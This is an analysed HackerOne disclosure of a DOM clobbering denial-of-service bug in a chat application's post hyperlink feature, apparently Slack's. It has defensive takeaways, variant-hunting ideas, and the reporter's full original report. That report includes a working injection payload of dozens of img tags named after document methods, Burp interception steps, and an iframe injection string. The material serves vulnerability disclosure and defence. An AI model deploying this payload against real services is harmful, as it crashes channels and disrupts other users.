# Denial of Service via DOM Clobbering in Hyperlinks

## Metadata
- **Source:** HackerOne
- **Report:** 1077136 | https://hackerone.com/reports/1077136
- **Submitted:** 2021-01-12
- **Reporter:** joaovitormaia
- **Program:** Slack (inferred from context)
- **Bounty:** Not specified in writeup
- **Severity:** High
- **Vuln:** HTML Injection, DOM Clobbering, Denial of Service, XSS (Cross-Site Scripting)
- **CVEs:** None
- **Category:** memory-binary

## Summary
An attacker can inject malicious HTML through the hyperlink creation feature in posts, causing DOM clobbering by creating img elements with name attributes that override critical document object methods. This causes application crashes when JavaScript attempts to invoke overridden functions like document.write(), document.getElementById(), etc.

## Attack scenario
1. Attacker creates a post and uses the 'create link' feature
2. Attacker intercepts the request via Burp Suite and replaces the link URL with a payload containing multiple img tags with name attributes matching document methods
3. The payload is injected into the DOM when the post is saved
4. When the post is shared to a channel or DM, the malicious HTML renders in other users' clients
5. JavaScript code attempting to call overridden document methods fails, causing application crashes
6. Users cannot navigate channels or view messages without deleting/editing the malicious post

## Root cause
Insufficient input validation on hyperlink URLs allowing HTML injection, combined with the browser's implicit DOM clobbering behavior where named img elements create properties on the document object that shadow native methods. The application fails to sanitize user input before rendering it in the DOM.

## Attacker mindset
An attacker seeks to disrupt service availability and user experience by exploiting an overlooked HTML injection vector. The attacker leverages knowledge of DOM clobbering mechanics to cause application-level crashes rather than typical XSS payloads, making detection harder and impact more severe.

## Defensive takeaways
- Implement strict input validation and sanitization on all user-supplied URLs and content, using allowlist approach for protocols (http/https only)
- Use Content Security Policy (CSP) to restrict script sources and prevent inline HTML execution
- Escape and encode all user input before rendering in DOM; use framework-level protections (React's JSX, Angular sanitization)
- Implement output encoding specific to the context (HTML entity encoding for HTML context)
- Use DOMPurify or similar libraries to sanitize user-generated HTML content
- Implement rate limiting on post creation/sharing to mitigate DOS impact
- Add server-side validation of post content and reject payloads containing multiple img tags with suspicious name attributes
- Monitor for patterns of DOM clobbering attempts in user content
- Educate developers on DOM clobbering risks and secure coding practices

## Variant hunting
Test other form inputs that accept URLs or hyperlinks for similar HTML injection
Check if other HTML elements (form, object, embed) can be injected to clobber document methods
Verify if the vulnerability applies to other document-level objects like window properties
Test whether the desktop and mobile applications properly sanitize the same input vectors
Search for similar injection points in chat, comment, or description fields
Test iframe injection on desktop application alongside the confirmed mobile impact
Attempt to clobber other critical objects (console, JSON, Promise, etc.) for expanded impact

## MITRE ATT&CK
- T1190
- T1059
- T1566.002
- T1185

## Notes
This vulnerability demonstrates the often-overlooked DOM clobbering attack vector. The attacker's payload is comprehensive, targeting many document methods simultaneously to ensure the application crashes. The writeup clearly shows multi-platform impact (web, desktop, mobile). The accessible attack surface (post creation feature) and ease of exploitation combined with severe impact (application-wide crashes) makes this a critical finding. The attacker's observation that deleting/editing the post is the only recovery method indicates no server-side cleanup or caching mechanisms.

## Full report
<details><summary>Expand</summary>

###Summary
Via html injection its possible to override all document functions, causing the application to crash because its using the element as a function.

###Brief explanation of how its possible override document functions with html injection:
In some html elements, the name attribute becomes a property on  the document object, so if ```<img src=x name="xyz">``` is inserted on the DOM, its created a reference for this element: ```document.xyz```. For some reason, if the name is the name of a function that already exists on the document object, its get overrided, so if ```<img src=x name="write">``` its inserted on the page, ```document.write````becomes the reference of the html element.

###PoC
Required tools:
1. BurpSuite

Repro Steps: 
 Click on the ```Create Post``` feature

{F1154882}

 Add any title and any content

 Select the content and click on the create link feature

{F1154880}

 Add any link:

{F1154891}

 Click on ```Ok``` and  intecept the request on burpsuite

 Replace the ```link``` property to the following one(as screenshot shows):

```
https://xyz.com\"><img src=x name='constructor' /><img src=x name='adoptNode' /><img src=x name='append' /><img src=x name='captureEvents' /><img src=x name='caretRangeFromPoint' /><img src=x name='clear' /><img src=x name='close' /><img src=x name='createAttribute' /><img src=x name='createAttributeNS' /><img src=x name='createCDATASection' /><img src=x name='createComment' /><img src=x name='createDocumentFragment' /><img src=x name='createElement' /><img src=x name='createElementNS' /><img src=x name='createEvent' /><img src=x name='createExpression' /><img src=x name='createNSResolver' /><img src=x name='createNodeIterator' /><img src=x name='createProcessingInstruction' /><img src=x name='createRange' /><img src=x name='createTextNode' /><img src=x name='createTreeWalker' /><img src=x name='elementFromPoint' /><img src=x name='elementsFromPoint' /><img src=x name='evaluate' /><img src=x name='execCommand' /><img src=x name='exitFullscreen' /><img src=x name='exitPointerLock' /><img src=x name='getElementById' /><img src=x name='getElementsByClassName' /><img src=x name='getElementsByName' /><img src=x name='getElementsByTagName' /><img src=x name='getElementsByTagNameNS' /><img src=x name='getSelection' /><img src=x name='hasFocus' /><img src=x name='importNode' /><img src=x name='open' /><img src=x name='prepend' /><img src=x name='queryCommandEnabled' /><img src=x name='queryCommandIndeterm' /><img src=x name='queryCommandState' /><img src=x name='queryCommandSupported' /><img src=x name='queryCommandValue' /><img src=x name='querySelector' /><img src=x name='querySelectorAll' /><img src=x name='releaseEvents' /><img src=x name='webkitCancelFullScreen' /><img src=x name='webkitExitFullscreen' /><img src=x name='write' /><img src=x name='writeln' /><img src=x name='getAnimations' /><img src=x name='exitPictureInPicture' /><img src=x name='replaceChildren' /><img src=x name='appendChild' /><img src=x name='cloneNode' /><img src=x name='compareDocumentPosition' /><img src=x name='contains' /><img src=x name='getRootNode' /><img src=x name='hasChildNodes' /><img src=x name='insertBefore' /><img src=x name='isDefaultNamespace' /><img src=x name='isEqualNode' /><img src=x name='isSameNode' /><img src=x name='lookupNamespaceURI' /><img src=x name='lookupPrefix' /><img src=x name='normalize' /><img src=x name='removeChild' /><img src=x name='replaceChild' /><img src=x name='addEventListener' /><img src=x name='dispatchEvent' /><img src=x name='removeEventListener' /><img src=x name='__defineGetter__' /><img src=x name='__defineSetter__' /><img src=x name='hasOwnProperty' /><img src=x name='__lookupGetter__' /><img src=x name='__lookupSetter__' /><img src=x name='isPrototypeOf' /><img src=x name='propertyIsEnumerable' /><img src=x name='toString' /><img src=x name='valueOf' /><img src=x name='toLocaleString' />
```

{F1154883}

Share the post on any channel:

{F1154884}

After that the application crash when you access the channel ou direct message:

{F1154881}

Its also pretty hard to navigate to another channel, so in many cases the slack application its all crashed(ex: when the user opened the message details and then the attacker change the content to the above payload)
The only way to stop the channel from crashing its deleting on editing the post.
###Observations
The desktop application its also affected
On the mobile application its possible to inject iframes so a phishing attack its also possible using this payload ```https://xyz.com\"><iframe>```:

{F1154910}

*I'm showing you guys the mobile impact as well because its probably the same entry point, so resolving one issue automatically solve the other

###Useful links
https://medium.com/@terjanq/dom-clobbering-techniques-8443547ebe94
https://portswigger.net/web-security/dom-based/dom-clobbering

## Impact

Its possible to disable a channel or a message conversation, and in some scenarios its possible to crash the entire slack application.

</details>

---
*Analysed by Claude on 2026-05-24*
